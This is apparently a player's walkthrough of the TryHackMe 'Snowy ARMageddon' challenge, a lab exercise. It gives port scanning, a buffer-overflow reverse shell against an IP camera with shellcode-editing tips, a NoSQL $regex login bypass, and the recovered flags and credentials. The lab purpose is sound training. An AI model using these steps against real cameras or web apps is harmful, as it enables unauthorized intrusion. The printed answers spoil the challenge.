# Snowy ARMageddon TryHackMe Walkthrough (Insane Difficulty)
This is a comprehensive step-by-step walkthrough for the "Snowy ARMageddon" (Insane Difficulty) challenge. Assume you're attacking from a Kali/BlackArch VM connected to the TryHackMe network, with the target IP as `<TARGET_IP> (10.10.x.x)`.
#
By the way before you scroll down enough, I want to show you the achievement badge that TryHackMe gave to me as I completed the challenge. This badge is also proof that I am an expert in this field: ![image alt](https://github.com/ilhambagas/Snowy-ARMageddon/blob/2d08c11ae61915f60a649292b502bd4cc4ef3ae0/TryHackMe%20Yeti%20Badge_Ilham%20Bagas%20A.png)

If you want to check or verify it, just click this TryHackMe link: https://tryhackme.com/ilhambagas/badges/aoc5sidequest1

Thankyou.
#
# Prerequisites:
- Install: sudo apt update && sudo apt install nmap ffuf burpsuite (or equivalent on your distro).
- Download wordlists: SecLists (/usr/share/seclists/Discovery/Web-Content/).
- For ARM exploits: Perl or Python with socket libraries.
#
## Task 1: What is the content of the first flag?
### Network Enumeration
Start by scanning the target for open ports and services. This reveals SSH (protected), Telnet (wrapped), a web server, and an unknown high port.

**Command:**
```text
nmap -sSVC -T4 -p- -v --open --reason -oA snowy_nmap <TARGET_IP>
```
**Expected Output (Key Ports):**
- 22/tcp: OpenSSH 8.2p1 (Ubuntu) – SSH, but key-auth only; skip for now.
- 23/tcp: tcpwrapped – Telnet, but connection refused initially.
- 8080/tcp: Apache 2.4.57 – Web server (cyber police dashboard).
- 50628/tcp: Unknown – IP camera service.

**Next Steps:**
- Parse output: nmap-parse-output snowy_nmap.xml group-by-service (if you have the tool).
- Visit http://<TARGET_IP>:8080/ – Shows an "angry elf" error page (403-like). No immediate access.
- Visit http://<TARGET_IP>:50628/ – Trivision NC-227WF HD 720P camera login page. Defaults `(admin:admin)` fail.

**Enumeration on Web (Port 8080):**

Fuzz for directories/files to find hidden paths
```text
ffuf -u http://<TARGET_IP>:8080/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -fc 403
```
### Exploit the IP Camera (Port 50628) – Buffer Overflow RCE
The camera is vulnerable to a buffer overflow in its web service, allowing root shell via a reverse shell. Research `Trivision NC-227WF exploit` to find PoCs (from BlackHat or similar talks). Use a pre-made Perl exploit to open Telnet, or craft a Python one for reverse shell.

**Option 1: Quick Perl PoC (Opens Telnet)**

Download a PoC script (from exploit-db or GitHub mirrors; search `trivision camera telnet exploit perl`).
```text
# Save as exploit.pl
# (Script sends overflow payload to enable unauth Telnet on port 23)
perl exploit.pl | nc <TARGET_IP> 50628
```
- This crashes the service briefly but enables Telnet access without creds.

Connect:
```text
telnet <TARGET_IP> 23
```
- Lands you in a BusyBox root shell (chrooted environment). Architecture: ARMv5 (confirm with cat /proc/cpuinfo).

**Option 2: Custom Python Reverse Shell (Advanced)**

If Perl fails, use a Python PoC from research (based on NC-228WF vuln).
1. Download base script (from no-sec.net or shell-storm.org).
2. Modify shellcode for your IP (avoid bad chars: 0x00, 0x09, 0x0a, 0x0d, 0x20, 0x23, 0x26).
    - Disassemble original shellcode (ARM little-endian) at shell-storm.org/online-disassembler.
    - Example mod for IP 10.10.x.x: Replace IP bytes with additions/subtractions (for 0x0a (10), use add r1, #0x0b; sub r1, #0x01).
    - Reassemble and update script variables: HOST=<TARGET_IP>, LHOST=<YOUR_IP>, LPORT=4444.

Command:
```text
python3 exploit.py <TARGET_IP> <YOUR_IP> 4444
nc -lvnp 4444  # Listener on your machine
```
- Success: Reverse shell as `root@NC-227WF-HD-720P`.

System Exploration (in Shell):
- BusyBox limits: No find, use ls -R / or manual traversal.
```text
ls -la /var/etc/
cat /var/etc/umconfig.txt  # Web config file
```
- Reveals admin creds:

  name=`admin`

  password=`Y3tiStarCur!ouspassword=admin`

### Retrieve the First Flag
Use the camera creds to auth on the web interface.

**Steps:**
1. Go to http://<TARGET_IP>:50628/en/login.asp.
2. Login: Username `admin`, Password `Y3tiStarCur!ouspassword=admin`.
3. Navigate to http://<TARGET_IP>:50628/en/player/mjpeg_vga.asp (MJPEG stream).
4. The "home page" or stream background reveals the flag (Yeti photo with text).
### First Flag
`THM{YETI_ON_SCREEN_ELUSIVE_CAMERA_STAR}`
#
## Task 2: What is the content of the yetikey2.txt file?
### NoSQL Injection on Web App (Port 8080)
The app's PHP 8.1.26 with MongoDB backend (leaf logo hint). Dir enum with ffuf/gobuster:
```text
ffuf -u http://<TARGET_IP>:8080/FUZZ/ -w /usr/share/wordlists/dirb/common.txt -fs 933  # Add trailing / to bypass 403s
```
Finds `/login.php/`, `/index.php/`. Hit http://<TARGET_IP>:8080/login.php/123 (slash bypasses checks) --> it's a police login form.

Intercept POST in Burp:
```text
POST /login.php/123 HTTP/1.1
Host: <TARGET_IP>:8080
Content-Type: application/x-www-form-urlencoded
...

username=admin&password=admin
```
Valid creds fail. MongoDB hint → NoSQL injection! Use `$regex` for bypass.

**Bypass Payload:**
enumerate first (script: https://github.com/an0nlk/Nosql-MongoDB-injection-username-password-enumeration):
```text
python nosql_enum.py -u http://<TARGET_IP>:8080/login.php/ -ep username
# Outputs: Frosteau (detective from story), etc.
```
Target "Frosteau":
```text
username[$regex]=Frosteau&password[$regex]=.*
```
Send in Burp, 302 redirect + PHPSESSID cookie. Follow to `/` with cookie: Welcome dashboard!
#
# Grab the Final Flag
In Frosteau's dashboard (http://<TARGET_IP>:8080/ with cookie), hunt files. The `yetikey2.txt` is in the user dir or visible on the page.

Content: `2-K@bWJ5oHFCR8o%whAvK5qw8Sp$5qf!nCqGM3ksaK` 

That's it, stealthy yeti wins!




















